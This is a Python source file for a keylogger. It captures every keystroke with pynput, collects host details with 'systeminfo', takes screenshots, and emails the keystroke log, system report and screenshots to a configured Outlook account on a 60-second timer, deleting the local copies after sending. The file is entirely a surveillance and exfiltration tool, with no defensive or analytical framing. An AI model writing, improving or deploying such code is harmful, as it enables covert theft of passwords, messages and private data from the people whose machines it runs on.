from importlib.metadata import files
import subprocess
from pynput.keyboard import Key, Listener
from threading import Timer, Event
from smtplib import SMTP
import logging
import os
from PIL import ImageGrab

class Keylogger:
    email = ''
    password = ''

    def __init__(self):
        self.stop_event = Event()
        logging.basicConfig(
            filename="log.txt",
            level=logging.DEBUG,
            style="{",
            datefmt='%Y-%m-%d %H:%M:%S',
            format='[{asctime}]: {message}',
            encoding='utf-8'
        )
        self.start_clear_timer()

    def send_email(self, email, password, subject, attachment=None):
        msg = f"Subject: {subject}\n\n"
        with open(attachment, 'rb') as file:
            msg += file.read().decode('utf-8')
        try:
            mail = SMTP('smtp-mail.outlook.com', 587)
            mail.starttls()
            mail.login(email, password)
            mail.sendmail(email, email, msg)
            mail.quit()
            print(f"Email sent successfully with attachment: {attachment}")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def key_press(self, key):
        try:
            press = str(key.char)
        except AttributeError:
            if key == Key.space:
                press = " "
            elif key == Key.esc:
                press = "[ESC]"
            else:
                press = str(key)
        with open("log.txt", "a", encoding='utf-8') as file:
            file.write(press)
        logging.debug(press)

    def clear_data(self):
        try:
            if os.path.exists("log.txt"):
                self.send_email(self.email, self.password, "Keylogger Log", "log.txt")
                os.remove("log.txt")
                self.stop_event.set()
        except Exception as e:
            print(f"Error clearing data or sending email: {e}")
        finally:
            self.start_clear_timer()

    def start_clear_timer(self):
        if not self.stop_event.is_set():
            Timer(60, self.clear_data).start()

    def info_system(self):
        try:
            Id = subprocess.check_output(["systeminfo"]).decode("utf-8").split("\n")
            new = [item.strip() for item in Id]
            with open("system_info.txt", "w", encoding='utf-8') as file:
                for line in new:
                    file.write(line + "\n")
            self.send_email(self.email, self.password, "System Information", "system_info.txt")
            print(f"System information has been written to system_info.txt and emailed.")
        except Exception as e:
            print(f"Error gathering system information or sending email: {e}")

    def screenshot(self):
        try:
            img = ImageGrab.grab()
            img.save("screenshot.png")
            self.send_email(self.email, self.password, "Screenshot", "screenshot.png")
            os.remove("screenshot.png")
            print("Screenshot taken and sent.")
        except Exception as e:
            print(f"Error taking or sending screenshot: {e}")

    def start(self):
        # Start the keylogger
        with Listener(on_press=self.key_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.info_system()
    keylogger.start()
